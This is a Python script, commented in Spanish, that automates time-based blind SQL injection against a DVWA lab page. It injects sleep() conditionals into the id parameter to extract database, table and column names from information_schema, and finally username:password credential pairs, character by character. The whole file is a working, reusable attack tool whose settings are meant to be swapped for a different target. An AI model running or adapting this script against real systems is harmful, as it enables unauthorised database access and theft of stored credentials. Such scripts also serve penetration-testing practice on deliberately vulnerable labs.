#!/bin/python3
import requests, time, string
import urllib3; urllib3.disable_warnings()

# ----------- VARIABLES GLOBALES ------------------------------ # 
DATABASE = "dvwa"
TABLA = "users"
COLUMNA1 = "username"
COLUMNA2 = "password"
TIEMPO = 1
METHOD = "GET"

def make_request(sqli):
	URL = "http://192.168.38.132/dvwa/vulnerabilities/sqli/?id=1" +  sqli + "&Submit=Submit"
	COOKIES = {"security":"low", "PHPSESSID":"3a3c041e13e5a80b51b0198e35d1ef6e"}
	HEADERS = "" # ej URL = "https://admin-portal.europacorp.htb/login.php"
	DATA = "" #ej DATA = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
	
#### Ya no hay que tocar mas nada ##############
# ---------------------------------------- #    
	inicio = time.time()
	if METHOD == "GET":
		req = requests.get(URL, cookies=COOKIES, headers=HEADERS, verify=False)
	elif METHOD == "POST":
		req = requests.post(URL, data=DATA ,cookies=COOKIES, headers=HEADERS, verify=False)
	final = time.time()
	tiempo = final - inicio
	return tiempo
	
def two_loops(caracteres, mensaje, sql, DATABASE, TABLA, COLUMNA1, COLUMNA2):
	print(mensaje)
	resultado = ""; slip = "',sleep(" + str(TIEMPO) + "),1)-- -"
	for pos in range(1,30):
		for letra in caracteres:
			if sql == "db":
				sqli = "' and if(substr(DATABASE()," + str(pos) + ",1)='" + letra + slip
			if sql == "dt":
				sqli = "' and if(substr((select group_concat(" + COLUMNA1 +",0x3a," + COLUMNA2 +") from "
				sqli += TABLA + ")," + str(pos) + ",1)='" + letra + slip
			tiempo = make_request(sqli)
			if tiempo > 1:
				resultado += letra
				print(resultado)
				break

def three_loops(caracteres, mensaje, sql, DATABASE, TABLA):
	print(mensaje)
	resultado = ""; slip = "',sleep(" + str(TIEMPO) + "),1)-- -"
	for i in range(10):
		for pos in range(1,20):
			for letra in caracteres:
				if sql == "db":
					sqli = "' and if(substr((select schema_name from information_schema.schemata limit " 
					sqli += str(i) + ",1)," + str(pos) + ",1)='" + letra + slip
				if sql == "tb":
					sqli = "' and if(substr((select table_name from information_schema.tables where"
					sqli += " table_schema ='" +  DATABASE + "' limit " + str(i) + ",1)," + str(pos) + ",1)='"
					sqli += letra + slip
				if sql == "cl":
					sqli = "' and if(substr((select column_name from information_schema.columns where"
					sqli += " table_schema='" + DATABASE + "' and table_name='" + TABLA + "' limit " 
					sqli += str(i) + ",1)," + str(pos) + ",1)='" + letra + slip
				tiempo = make_request(sqli)
				if tiempo > TIEMPO:
					resultado += letra
					print(resultado)
					break
		resultado += ", "
# ----------------------------------------- # 
def databases(sql):
	caracteres = string.ascii_lowercase
	mensaje = "[*] Base de datos actual: "; DATABASE =""; TABLA = ""
	two_loops(caracteres, mensaje, sql, DATABASE, TABLA, COLUMNA1, COLUMNA2)
	caracteres = string.ascii_lowercase + "_"
	mensaje = "[*] Otras bases de datos: "; DATABASE = ""; TABLA = ""
	three_loops(caracteres, mensaje, sql, DATABASE, TABLA)

def tablas(sql, DATABASE):
	caracteres = string.ascii_lowercase + "_"
	mensaje = "[*] Nombres de tablas: "; TABLA = ""
	three_loops(caracteres, mensaje, sql, DATABASE, TABLA)

def columnas(sql, DATABASE, TABLA):
	caracteres = string.ascii_lowercase + "_"
	mensaje = "[*] Nombres de columnas: "
	three_loops(caracteres, mensaje, sql, DATABASE, TABLA)

def datos(sql, DATABASE, TABLA,COLUMNA1, COLUMNA2):
	caracteres = string.ascii_lowercase + "_" + string.digits + string.punctuation
	mensaje = "[*] Credenciales: "
	two_loops(caracteres, mensaje, sql, DATABASE, TABLA, COLUMNA1, COLUMNA2)

	
# --------------------------------------------- # 

print("[!] MODOS ->  [ db = modo databases  ||  tb = modo tablas  || cl = modo columnas  || dt = modo credenciales ]")
print("[!] Adapta las variables globales dentro del script para hacer que funcione")
print("---------------------------------------------")
sql = input("Modo(db/tb/cl/dt): ")
if sql == "db":
	databases(sql)
if sql == "tb":
	tablas(sql, DATABASE)
if sql == "cl":
	columnas(sql, DATABASE, TABLA)
if sql == "dt":
	datos(sql, DATABASE, TABLA, COLUMNA1, COLUMNA2)

